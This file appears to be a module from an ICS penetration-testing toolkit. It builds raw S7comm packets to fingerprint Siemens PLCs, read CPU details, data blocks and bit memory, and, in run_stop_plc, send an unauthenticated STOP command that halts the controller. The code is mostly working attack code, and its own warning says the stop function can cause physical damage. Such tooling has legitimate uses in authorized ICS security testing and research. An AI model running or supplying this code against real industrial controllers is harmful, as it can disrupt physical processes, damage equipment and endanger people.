"""
Siemens S7comm scripts via raw TPKT/COTP/S7 sockets.
"""

import socket
import struct
from typing import Generator


_TIMEOUT = 5


def _s7_connect(host: str, port: int = 102):
    """Establish TPKT/COTP connection to S7 PLC."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(_TIMEOUT)
    sock.connect((host, int(port)))

    # COTP Connection Request (CR)
    cotp_cr = bytes([
        0x03, 0x00, 0x00, 0x16,  # TPKT: version=3, reserved=0, length=22
        0x11,                     # COTP length indicator (17 bytes follow)
        0xe0,                     # COTP: CR PDU type
        0x00, 0x00,               # DST-REF
        0x00, 0x01,               # SRC-REF
        0x00,                     # Class
        # TPDU-SIZE option
        0xc0, 0x01, 0x0a,
        # SRC-TSAP (0x0100 = PG/PC)
        0xc1, 0x02, 0x01, 0x00,
        # DST-TSAP (0x0200 = S7-300 rack 0, slot 2)
        0xc2, 0x02, 0x01, 0x02,
    ])
    sock.send(cotp_cr)
    resp = sock.recv(1024)
    if len(resp) < 5 or resp[5] != 0xd0:
        raise ConnectionError(f"COTP CC not received, got: {resp.hex()}")

    # S7comm SETUP COMMUNICATION
    s7_setup = bytes([
        0x03, 0x00, 0x00, 0x19,  # TPKT
        0x02, 0xf0, 0x80,        # COTP DT
        # S7 header
        0x32, 0x01,              # Protocol ID + ROSCTR (job)
        0x00, 0x00,              # Redundancy ID
        0x00, 0x00,              # PDU reference
        0x00, 0x08,              # Parameter length
        0x00, 0x00,              # Data length
        # Setup comm parameters
        0xf0, 0x00,
        0x00, 0x01, 0x00, 0x01,  # Max AMQ caller/callee
        0x03, 0xc0,              # PDU size 960
    ])
    sock.send(s7_setup)
    resp = sock.recv(1024)
    return sock


def run_read_szl(host: str, port: int = 102) -> Generator[str, None, None]:
    """Read SZL (System Status List) — device info fingerprint."""
    yield f"[*] S7comm - Read SZL (System Info) | {host}:{port}"
    try:
        sock = _s7_connect(host, int(port))
        yield f"[+] TPKT/COTP/S7 connection established"

        # SZL Read request for ID=0x0011 (Module Identification)
        szl_req = bytes([
            0x03, 0x00, 0x00, 0x21,  # TPKT
            0x02, 0xf0, 0x80,        # COTP DT
            0x32, 0x07,              # S7 header: userdata
            0x00, 0x00, 0x00, 0x01,
            0x00, 0x08, 0x00, 0x08,
            0x00, 0x01, 0x12, 0x04,
            0x11, 0x44, 0x01, 0x00,  # SZL read request
            0xff, 0x09, 0x00, 0x04,
            0x00, 0x11, 0x00, 0x00,  # SZL ID=0x0011
        ])
        sock.send(szl_req)
        resp = sock.recv(4096)
        if len(resp) > 30:
            yield f"[+] SZL Response ({len(resp)} bytes):"
            yield f"    Raw: {resp[28:].hex()}"
            # Try to extract ASCII strings
            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in resp[28:])
            yield f"    Text: {printable}"
        else:
            yield f"[-] Short response: {resp.hex()}"
        sock.close()
    except Exception as e:
        yield f"[!] Exception: {e}"


def run_cpu_info(host: str, port: int = 102) -> Generator[str, None, None]:
    """Read CPU state and order number."""
    yield f"[*] S7comm - CPU Info | {host}:{port}"
    try:
        sock = _s7_connect(host, int(port))
        yield f"[+] Connected"

        # SZL read for order number (ID=0x0011, Index=0x0001)
        szl_req = bytes([
            0x03, 0x00, 0x00, 0x21,
            0x02, 0xf0, 0x80,
            0x32, 0x07,
            0x00, 0x00, 0x00, 0x02,
            0x00, 0x08, 0x00, 0x08,
            0x00, 0x01, 0x12, 0x04,
            0x11, 0x44, 0x01, 0x00,
            0xff, 0x09, 0x00, 0x04,
            0x00, 0x11, 0x00, 0x01,
        ])
        sock.send(szl_req)
        resp = sock.recv(4096)
        if len(resp) > 40:
            yield f"[+] Module Info ({len(resp)} bytes):"
            data = resp[40:]
            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
            yield f"    Order#/Info: {printable[:40]}"
        else:
            yield f"[-] Unexpected response length: {len(resp)}"
        sock.close()
    except Exception as e:
        yield f"[!] Exception: {e}"


def run_read_data_block(host: str, port: int = 102, db: int = 1, start: int = 0, length: int = 16) -> Generator[str, None, None]:
    """Read raw bytes from a Data Block."""
    yield f"[*] S7comm - Read DB{db}.DBB{start} ({length} bytes) | {host}:{port}"
    try:
        sock = _s7_connect(host, int(port))
        yield f"[+] Connected"

        db = int(db); start = int(start); length = int(length)
        # S7 Read Var request
        read_req = bytes([
            0x03, 0x00, 0x00, 0x1f,
            0x02, 0xf0, 0x80,
            0x32, 0x01, 0x00, 0x00,
            0x00, 0x03, 0x00, 0x0e, 0x00, 0x00,
            0x04, 0x01,              # Read, 1 item
            0x12, 0x0a, 0x10,
            0x02,                    # BYTE transport size
            (length >> 8) & 0xff, length & 0xff,  # count
            (db >> 8) & 0xff, db & 0xff,           # DB number
            0x84,                    # Area: DB
            (start * 8 >> 16) & 0xff, (start * 8 >> 8) & 0xff, (start * 8) & 0xff,  # bit address
        ])
        sock.send(read_req)
        resp = sock.recv(4096)
        # Data starts after S7 header (at offset ~25+)
        if len(resp) > 27:
            data = resp[27:]
            yield f"[+] DB{db} data at offset {start} ({len(data)} bytes):"
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = ' '.join(f'{b:02X}' for b in chunk)
                asc_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                yield f"    {start+i:04X}  {hex_part:<48}  {asc_part}"
        else:
            yield f"[-] Short response: {resp.hex()}"
        sock.close()
    except Exception as e:
        yield f"[!] Exception: {e}"


def run_stop_plc(host: str, port: int = 102) -> Generator[str, None, None]:
    """Send STOP command to PLC (DANGEROUS)."""
    yield f"[!] WARNING: This will attempt to STOP the PLC at {host}:{port}"
    yield f"[!] Only use on authorized test systems. This can cause physical damage!"
    try:
        sock = _s7_connect(host, int(port))
        yield f"[+] Connected"

        stop_req = bytes([
            0x03, 0x00, 0x00, 0x21,
            0x02, 0xf0, 0x80,
            0x32, 0x01, 0x00, 0x00,
            0x00, 0x0e, 0x00, 0x10, 0x00, 0x00,
            0x29, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x09,
            0x50, 0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d,  # "_PROGRAM"
        ])
        sock.send(stop_req)
        resp = sock.recv(1024)
        yield f"[+] STOP command sent. Response: {resp.hex()}"
        sock.close()
    except Exception as e:
        yield f"[!] Exception: {e}"


def run_read_marker(host: str, port: int = 102, start: int = 0, length: int = 16) -> Generator[str, None, None]:
    """Read Merker (bit memory) area."""
    yield f"[*] S7comm - Read Merker M{start}..M{int(start)+int(length)-1} | {host}:{port}"
    try:
        sock = _s7_connect(host, int(port))
        yield f"[+] Connected"

        start = int(start); length = int(length)
        read_req = bytes([
            0x03, 0x00, 0x00, 0x1f,
            0x02, 0xf0, 0x80,
            0x32, 0x01, 0x00, 0x00,
            0x00, 0x05, 0x00, 0x0e, 0x00, 0x00,
            0x04, 0x01,
            0x12, 0x0a, 0x10,
            0x02,  # BYTE
            (length >> 8) & 0xff, length & 0xff,
            0x00, 0x00,  # DB=0
            0x83,        # Area: Merker
            (start * 8 >> 16) & 0xff, (start * 8 >> 8) & 0xff, (start * 8) & 0xff,
        ])
        sock.send(read_req)
        resp = sock.recv(4096)
        if len(resp) > 27:
            data = resp[27:]
            yield f"[+] Merker bytes M{start}..M{start+len(data)-1}:"
            for i, b in enumerate(data):
                yield f"    MB{start+i}: {b} (0x{b:02X}) [{b:08b}]"
        else:
            yield f"[-] Short response"
        sock.close()
    except Exception as e:
        yield f"[!] Exception: {e}"
